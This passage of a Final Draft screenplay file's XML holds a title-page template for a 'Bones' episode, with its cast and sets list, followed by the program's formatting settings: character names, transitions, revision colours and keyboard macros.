<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">Address Line 2</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">City, State Zip code     MM </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">DD</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">, </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">YYYY</Text>
<Tabstops>
<Tabstop Position="6.00" Type="Left"/>
</Tabstops>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="Yes">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">Bones</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="24" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">"</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">Episode Title</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">"</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">CAST</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">DR. TEMPERANCE "BONES" BRENNAN </Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">ANGELA MONTENEGRO</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">SPECIAL AGENT </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">SEELEY</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"> BOOTH</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">DR. JACK </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">HODGINS</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">DR. CAMILLE </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">SAROYAN</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">DR. LANCE SWEETS</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="24" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="Yes">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">Bones</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">"</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">Episode Title</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">"</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline+AllCaps">Sets</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline+AllCaps">Interiors</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">: </Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline+AllCaps">Exteriors</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">:</Text>
<Tabstops>
<Tabstop Position="5.25" Type="Left"/>
</Tabstops>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">Smithsonian</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"> medico-legal Lab </Text>
<Tabstops>
<Tabstop Position="5.25" Type="Left"/>
</Tabstops>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">Brennan's co-op/brennan's bedroom</Text>
<Tabstops>
<Tabstop Position="5.25" Type="Left"/>
</Tabstops>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">Medico-legal building/angela's area</Text>
<Tabstops>
<Tabstop Position="5.25" Type="Left"/>
</Tabstops>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">Booth's vehicle/travelling </Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""> </Text>
<Tabstops>
<Tabstop Position="5.25" Type="Left"/>
</Tabstops>
</Paragraph>
</Content>
<TextState Scaling="100" Selection="0,0" ShowInvisibles="No"/>
</TitlePage>
<ScriptNoteDefinitions Active="1">
<ScriptNoteDefinition Color="#000000000000" ID="1" Marker="!" Name="Important"/>
<ScriptNoteDefinition Color="#000000000000" ID="2" Marker="?" Name="Information"/>
<ScriptNoteDefinition Color="#000000000000" ID="3" Marker="*" Name="Suggestion"/>
</ScriptNoteDefinitions>
<SmartType>
<Characters>
<Character>Brennan</Character>
<Character>DR. JACK HODGINS</Character>
<Character>Special agent booth</Character>
<Character>Angela</Character>
<Character>CAMILLE</Character>
</Characters>
<Extensions>
<Extension>(V.O.)</Extension>
<Extension>(O.S.)</Extension>
<Extension>(O.C.)</Extension>
<Extension>(SUBTITLE)</Extension>
</Extensions>
<SceneIntros Separator=". ">
<SceneIntro>INT</SceneIntro>
<SceneIntro>EXT</SceneIntro>
<SceneIntro>I/E</SceneIntro>
</SceneIntros>
<Locations/>
<TimesOfDay Separator=" - ">
<TimeOfDay>DAY</TimeOfDay>
<TimeOfDay>NIGHT</TimeOfDay>
<TimeOfDay>AFTERNOON</TimeOfDay>
<TimeOfDay>MORNING</TimeOfDay>
<TimeOfDay>EVENING</TimeOfDay>
<TimeOfDay>LATER</TimeOfDay>
<TimeOfDay>MOMENTS LATER</TimeOfDay>
<TimeOfDay>CONTINUOUS</TimeOfDay>
<TimeOfDay>THE NEXT DAY</TimeOfDay>
</TimesOfDay>
<Transitions>
<Transition>CUT TO:</Transition>
<Transition>FADE IN:</Transition>
<Transition>FADE OUT.</Transition>
<Transition>FADE TO:</Transition>
<Transition>DISSOLVE TO:</Transition>
<Transition>BACK TO:</Transition>
<Transition>MATCH CUT TO:</Transition>
<Transition>JUMP CUT TO:</Transition>
<Transition>FADE TO BLACK.</Transition>
</Transitions>
</SmartType>
<MoresAndContinueds>
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""/>
<DialogueBreaks AutomaticCharacterContinueds="Yes" BottomOfPage="Yes" DialogueBottom="(MORE)" DialogueTop="(CONT'D)" TopOfNext="Yes"/>
<SceneBreaks ContinuedNumber="No" SceneBottom="(CONTINUED)" SceneBottomOfPage="No" SceneTop="CONTINUED:" SceneTopOfNext="No"/>
</MoresAndContinueds>
<LockedPages/>
<Revisions ActiveSet="1" Location="7.75" RevisionMode="No" RevisionsShown="Active" ShowAllMarks="No" ShowAllSets="No">
<Revision Color="#00000000FFFF" FullRevision="No" ID="1" Mark="*" Name="Production White" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="2" Mark="*" Name="Blue - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="3" Mark="*" Name="Pink - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="4" Mark="*" Name="Yellow - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="5" Mark="*" Name="Green - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="6" Mark="*" Name="Goldenrod - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="7" Mark="*" Name="Buff - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="8" Mark="*" Name="Salmon - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="9" Mark="*" Name="Cherry - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="10" Mark="*" Name="Tan - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="11" Mark="*" Name="2nd White - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="12" Mark="*" Name="2nd Blue - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="13" Mark="*" Name="2nd Pink - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="14" Mark="*" Name="2nd Yellow - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="15" Mark="*" Name="2nd Green - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="16" Mark="*" Name="2nd Goldenrod - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="17" Mark="*" Name="2nd Buff - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="18" Mark="*" Name="2nd Salmon - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="19" Mark="*" Name="2nd Cherry - mm/dd/yyyy" Style=""/>
<Revision Color="#00000000FFFF" FullRevision="No" ID="20" Mark="*" Name="2nd Tan - mm/dd/yyyy" Style=""/>
</Revisions>
<SplitState ActivePanel="1" SplitMode="None" SplitterPosition="637">
<ScriptPanel DisplayMode="Page">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Verdana" RevisionID="0" Size="9" Style=""/>
</ScriptPanel>
</SplitState>
<Macros>
<Macro Element="Scene Heading" Name="INT" Shortcut="Ctrl+Alt+1" Text="INT. " Transition="None">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Scene Heading" Name="EXT" Shortcut="Ctrl+Alt+2" Text="EXT. " Transition="None">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Scene Heading" Name="I/E" Shortcut="Ctrl+Alt+3" Text="I/E " Transition="None">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Scene Heading" Name="DAY" Shortcut="Ctrl+Alt+4" Text=" - DAY" Transition="Action">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Scene Heading" Name="NIGHT" Shortcut="Ctrl+Alt+5" Text=" - NIGHT" Transition="Action">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Scene Heading" Name="SUNRISE" Shortcut="Ctrl+Alt+6" Text=" - SUNRISE" Transition="Action">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Scene Heading" Name="MAGIC" Shortcut="Ctrl+Alt+7" Text=" - MAGIC" Transition="Action">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Parenthetical" Name="CONT" Shortcut="Ctrl+Alt+8" Text="continuing" Transition="Dialogue">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Parenthetical" Name="INTER" Shortcut="Ctrl+Alt+9" Text="interrupting" Transition="Dialogue">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="None" Name="" Shortcut="E" Text="" Transition="None">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="CUTTO" Shortcut="Ctrl+Shift+Alt+1" Text="CUT TO:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Action" Name="FADEIN" Shortcut="Ctrl+Shift+Alt+2" Text="FADE IN:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="FADEOUT" Shortcut="Ctrl+Shift+Alt+3" Text="FADE OUT." Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="FADETO" Shortcut="Ctrl+Shift+Alt+4" Text="FADE TO:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="DISSLV" Shortcut="Ctrl+Shift+Alt+5" Text="DISSOLVE TO:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="BACKTO" Shortcut="Ctrl+Shift+Alt+6" Text="BACK TO:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="MATCHCUT" Shortcut="Ctrl+Shift+Alt+7" Text="MATCH CUT TO:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="JUMPCUT" Shortcut="Ctrl+Shift+Alt+8" Text="JUMP CUT TO:" Transition="Scene Heading">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="Transition" Name="FBLACK" Shortcut="Ctrl+Shift+Alt+9" Text="FADE TO BLACK." Transition="None">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="None" Name="" Shortcut="E" Text="" Transition="None">
<Alias Confirm="No" MatchCase="No" SmartReplace="Yes" Text="" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="Parenthetical"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="End Of Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
